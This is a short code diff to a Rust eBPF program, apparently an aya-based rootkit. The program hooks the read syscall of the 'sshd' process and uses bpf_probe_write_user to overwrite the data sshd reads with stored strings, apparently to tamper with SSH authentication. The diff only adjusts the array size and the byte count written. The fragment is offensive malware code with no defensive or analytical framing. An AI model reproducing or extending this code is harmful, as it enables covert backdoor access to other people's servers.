@@ -26,7 +26,7 @@ static map_buff_addrs: HashMap<u64, SyscallReadLogging> =
 
 #[allow(non_upper_case_globals)]
 #[map]
-static string_array: Array<StringInfo> = Array::with_max_entries(10, 0);
+static string_array: Array<StringInfo> = Array::with_max_entries(1, 0);
 
 #[allow(non_upper_case_globals)]
 const target_comm: &[u8] = b"sshd";
@@ -113,7 +113,7 @@ fn sys_exit_read_check(ctx: TracePointContext) -> Result<u32, u32> {
 
             if let Some(info) = string_array.get(index) {
                 let tobe = info.str.as_ptr();
-                bpf_probe_write_user(tmpbuf as *mut c_void, tobe as *const c_void, 581);
+                bpf_probe_write_user(tmpbuf as *mut c_void, tobe as *const c_void, 740);
                 info!(&ctx, "tmpbuf: 0x{:x}", tmpbuf);
             } else {
                 return Err(0);
